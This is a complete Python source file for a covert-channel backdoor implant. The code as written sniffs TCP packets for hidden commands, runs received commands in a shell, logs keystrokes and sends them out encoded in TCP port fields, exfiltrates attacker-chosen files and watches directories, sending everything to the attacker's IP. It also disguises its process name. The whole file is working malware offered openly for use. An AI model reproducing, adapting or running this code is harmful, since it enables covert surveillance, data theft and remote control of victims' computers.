#!/usr/bin/env python

### GENERAL ###############################################################################
###########################################################################################
import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

from multiprocessing import Process
from setproctitle import getproctitle, setproctitle
from scapy.all import *
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import os
import sys
import time

# process name
PROC_NAME = "abc"

# IP address of the attacker
ATK_IP = ""

### KEYLOGGER #############################################################################
###########################################################################################
from pynput.keyboard import Key, Listener

CAESAR_KEY = 11
KEYLOGGER_PROCESS = None

### TRANSFER ##############################################################################
###########################################################################################
from cryptography.fernet import Fernet

PATH_TRANSFER = ""
TRANSFER_PROCESS = None

### MONITOR ###############################################################################
###########################################################################################
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import LoggingEventHandler
import logging

PATH_LOG_FOLDER = ""

PATH_FILE = ""
PATH_LOG_FILE = ""

PATH_DIR = ""

FILE_PROCESS = None
DIR_PROCESS = None

### COVERT CHANNEL ########################################################################
###########################################################################################
from Crypto.Cipher import AES
import subprocess

# key value has to be 16 bytes for AES encryption
DEFAULT_KEY = "absentmindedness"
# salt value has to be 16 bytes for AES encryption
DEFAULT_SALT = "overenthusiastic"

### KEYLOGGER #############################################################################
###########################################################################################
def keylogger_encrypt(data, CAESAR_KEY):
    try:
        enc_data = ""

        for i in range(len(data)):
            char = data[i]
            enc_data += chr((ord(char) + CAESAR_KEY) % 128)

        return enc_data
    except Exception as error:
        print(str(error))

def send_packet_keylogger(enc_data):
    for x in enc_data:
        char = ord(x)
        pkt = IP(dst=ATK_IP) / TCP(sport=char, dport=RandNum(1025, 65535), seq=3333, flags="E")
        yield pkt

def on_press(key):
    try:
        enc_data = keylogger_encrypt(format(key.char), CAESAR_KEY)
        pkts = send_packet_keylogger(enc_data)

        for pkt in pkts:
            send(pkt, verbose=0)
    except AttributeError:
        pass

def on_release(key):
    pass

def keylogger_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

### TRANSFER ##############################################################################
###########################################################################################
class BreakException(Exception):
    pass

def check_tname(name):
    isExist = os.path.isfile(name)
    return isExist

def send_packet_tfile(data):
    count = 0

    while count < len(data):
        trunc_data = data[count:count+500]
        enc_data = encrypt(trunc_data)
        tfile_packet = Ether() / IP(dst=ATK_IP) / TCP(sport=7000, dport=RandNum(1025, 65535), seq=5555, flags="C") / Raw(load=enc_data)
        count = count + 500
        time.sleep(0.1)
        sendp(tfile_packet, verbose=0)

    time.sleep(1)
    eof_packet = Ether() / IP(dst=ATK_IP) / TCP(sport=8080, dport=RandNum(1025, 65535), seq=5555, flags="C")
    sendp(eof_packet, verbose=0)

def transfer_file(file):
    with open(file, "rb") as f:
        data = f.read()
        send_packet_tfile(data)

### MONITOR (FILE) ########################################################################
###########################################################################################
class MonitorFile(FileSystemEventHandler):
    def on_modified(self, event):
        log = datetime.now().strftime("%Y-%m-%d_%H:%M:%S_") + str(event) + "\n"
        send_packet_flog(log)

        time.sleep(0.1)
        with open(PATH_FILE, "rb") as f:
            data = f.read()
            send_packet_file(data)

def send_packet_flog(data):
    enc_data = encrypt(data.encode())
    flog_packet = Ether() / IP(dst=ATK_IP, ttl=4) / TCP(sport=7000, dport=RandNum(1025, 65535), seq=7777, flags="A") / Raw(load=enc_data)
    time.sleep(0.1)
    sendp(flog_packet, verbose=0)

def send_packet_file(data):
    count = 0

    while count < len(data):
        trunc_data = data[count:count+100]
        enc_data = encrypt(trunc_data)
        file_packet = Ether() / IP(dst=ATK_IP, ttl=4) / TCP(sport=8000, dport=RandNum(1025, 65535), seq=7777, flags="A") / Raw(load=enc_data)
        count = count + 100
        time.sleep(0.1)
        sendp(file_packet, verbose=0)
    
    time.sleep(1)
    eof_packet = Ether() / IP(dst=ATK_IP, ttl=4) / TCP(sport=8080, dport=RandNum(1025, 65535), seq=7777, flags="A")
    sendp(eof_packet, verbose=0)

def file_listener():
    event_handler = MonitorFile()
    observer = Observer()
    observer.schedule(event_handler, PATH_FILE, recursive=True)
    observer.start()

    while True:
        time.sleep(10)

def check_fname(name):
    isExist = os.path.isfile(name)
    return isExist

def check_str(fullstring, substring):
    if fullstring.find(substring) == -1:
        return True
    else:
        return False

### MONITOR (DIR) #########################################################################
###########################################################################################
class MonitorDir(FileSystemEventHandler):
    def on_any_event(self, event):
        if event.is_directory:
            return

        fname = os.path.basename(event.src_path)
        ext = fname.split(".")[-1]

        if event.event_type == "closed":
            if any(char.isdigit() for char in ext):
                pass
            elif check_str(fname, ".") and check_str(fname, "-") and check_str(fname, "+"):
                path = os.path.splitext(event.src_path)[0]

                time.sleep(0.1)
                with open(path, "rb") as f:
                    data = f.read()
                    send_packet_dir(fname, data)
        elif event.event_type == "created":
            if any(char.isdigit() for char in ext):
                pass
            elif ext == "part":
                path = os.path.splitext(event.src_path)[0]
                file_name = os.path.basename(path)

                with open(path, "rb") as f:
                    data = f.read()
                    send_packet_dir(file_name, data)
        elif event.event_type == "modified":
            if any(char.isdigit() for char in ext):
                pass
            elif check_str(fname, "-") and check_str(fname, "+"):
                if not (ext == "part" or ext == "kate-swp"):
                    with open(event.src_path, "rb") as f:
                        data = f.read()
                        send_packet_dir(fname, data)
        else:
            pass

def send_packet_dir(fname, data):
    enc_data1 = encrypt(fname.encode())
    fname_packet = Ether() / IP(dst=ATK_IP) / TCP(sport=7080, dport=RandNum(1024, 65535), seq=9999, flags="U") / Raw(load=enc_data1)
    sendp(fname_packet, verbose=0)
    time.sleep(0.5)

    count = 0

    while count < len(data):
        trunc_data = data[count:count+1000]
        enc_data2 = encrypt(trunc_data)
        dir_packet = Ether() / IP(dst=ATK_IP, ttl=4) / TCP(sport=8000, dport=RandNum(1025, 65535), seq=9999, flags="U") / Raw(load=enc_data2)
        count = count + 1000
        time.sleep(0.1)
        sendp(dir_packet, verbose=0)

    time.sleep(1)
    eof_packet = Ether() / IP(dst=ATK_IP, ttl=4) / TCP(sport=8080, dport=RandNum(1025, 65535), seq=9999, flags="U")
    sendp(eof_packet, verbose=0)

def dir_listener():
    event_handler = MonitorDir()
    observer = Observer()
    observer.schedule(event_handler, PATH_DIR, recursive=True)
    observer.start()

    while True:
        time.sleep(10)

def check_dname(name):
    isExist = os.path.isdir(name)
    return isExist

### SHELL SCRIPT ##########################################################################
###########################################################################################
class BreakException(Exception):
    pass

def encrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")
    encObj = AES.new(key, AES.MODE_CFB, salt)
    enc_data = encObj.encrypt(data)
    return enc_data

def decrypt(data):
    key = DEFAULT_KEY.encode("utf-8")
    salt = DEFAULT_SALT.encode("utf-8")
    decObj = AES.new(key, AES.MODE_CFB, salt)
    dec_data = decObj.decrypt(data)
    return dec_data

def recv_cmd(packet):
    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags
        srcIP = packet[IP].src

        if seq == 2223 and flag == "F" and Raw in packet[2]:
            cmd = decrypt(packet[Raw].load)

            if cmd.decode() == "exit":
                raise BreakException()

            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = process.communicate()
            data = stdout + stderr

            if data.strip() == "":
                data = "No output was generated from the command: {0}".format(cmd)

            enc_data = encrypt(data)
            data_packet = Ether() / IP(dst=srcIP) / TCP(dport=RandNum(1025, 65535), seq=2224, flags="F") / Raw(load=enc_data)
            time.sleep(0.1)
            sendp(data_packet, verbose=0)

def check_cmd(packet):
    if IP in packet[0] and Raw in packet[2]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags

        if seq == 2223 and flag == "F":
            return True
    else:
        return False

def shell_script():
    try:
        while True:
            sniff(filter='tcp', prn=recv_cmd, stop_filter=check_cmd)
    except BreakException:
        pass

### MENU ##################################################################################
###########################################################################################
def recv_menu(packet):
    global ATK_IP
    global KEYLOGGER_PROCESS
    global FILE_PROCESS
    global DIR_PROCESS
    global PATH_TRANSFER
    global PATH_FILE
    global PATH_DIR

    if IP in packet[0]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags

        if seq == 2222 and flag == "F":
            ATK_IP = packet[IP].src
            data = decrypt(packet[Raw].load)
            choice = data.decode()

            if choice == "1":
                KEYLOGGER_PROCESS = Process(target=keylogger_listener)
                KEYLOGGER_PROCESS.daemon = True
                KEYLOGGER_PROCESS.start()
            elif choice == "2":
                try:
                    KEYLOGGER_PROCESS.terminate()
                    KEYLOGGER_PROCESS.join()
                except AttributeError:
                    pass
            elif choice == "3":
                transfer_file(PATH_TRANSFER)
            elif choice == "4":
                FILE_PROCESS = Process(target=file_listener)
                FILE_PROCESS.daemon = True
                FILE_PROCESS.start()
                pass
            elif choice == "5":
                try:
                    FILE_PROCESS.terminate()
                    FILE_PROCESS.join()
                except AttributeError:
                    pass
            elif choice == "6":
                DIR_PROCESS = Process(target=dir_listener)
                DIR_PROCESS.daemon = True
                DIR_PROCESS.start()
            elif choice == "7":
                try:
                    DIR_PROCESS.terminate()
                    DIR_PROCESS.join()
                except AttributeError:
                    pass
            elif choice == "8":
                shell_script()
            elif choice == "0":
                sys.exit(0)
            else:
                set_pname(choice)

        elif seq == 4444 and flag == "C":
            ATK_IP = packet[IP].src
            data = decrypt(packet[Raw].load)
            tname = data.decode()

            time.sleep(1)

            if check_tname(tname):
                PATH_TRANSFER = tname
                check_tpkt = Ether() / IP(dst=ATK_IP) / TCP(sport=7000, dport=RandNum(1025, 65535), seq=4445, flags="C")
                sendp(check_tpkt, verbose=0)
            else:
                check_tpkt = Ether() / IP(dst=ATK_IP) / TCP(sport=8000, dport=RandNum(1025, 65535), seq=4445, flags="C")
                sendp(check_tpkt, verbose=0)

        elif seq == 6666 and flag == "A":
            ATK_IP = packet[IP].src
            data = decrypt(packet[Raw].load)
            fname = data.decode()

            time.sleep(1)

            if check_fname(fname):
                PATH_FILE = fname
                check_fpkt = Ether() / IP(dst=ATK_IP) / TCP(sport=7000, dport=RandNum(1025, 65535), seq=6667, flags="A")
                sendp(check_fpkt, verbose=0)
            else:
                check_fpkt = Ether() / IP(dst=ATK_IP) / TCP(sport=8000, dport=RandNum(1025, 65535), seq=6667, flags="A")
                sendp(check_fpkt, verbose=0)

        elif seq == 8888 and flag == "U":
            ATK_IP = packet[IP].src
            data = decrypt(packet[Raw].load)
            dname = data.decode()

            time.sleep(1)

            if check_dname(dname):
                PATH_DIR = dname
                check_dpkt = Ether() / IP(dst=ATK_IP) / TCP(sport=7000, dport=RandNum(1025, 65535), seq=8889, flags="U")
                sendp(check_dpkt, verbose=0)
            else:
                check_dpkt = Ether() / IP(dst=ATK_IP) / TCP(sport=8000, dport=RandNum(1025, 65535), seq=8889, flags="U")
                sendp(check_dpkt, verbose=0)

def check_menu(packet):
    if IP in packet[0] and Raw in packet[2]:
        seq = packet["TCP"].seq
        flag = packet["TCP"].flags

        if seq == 2222 and flag == "F":
            return True
    else:
        return False

def menu():
    while True:
        sniff(filter='tcp', prn=recv_menu, stop_filter=check_menu)

### SET-UP ################################################################################
###########################################################################################
def set_pname(pname):
    global PROC_NAME
    PROC_NAME = pname

    setproctitle(pname)

### MAIN ##################################################################################
###########################################################################################
def main():
    set_pname(PROC_NAME)
    menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit("\nExiting...")
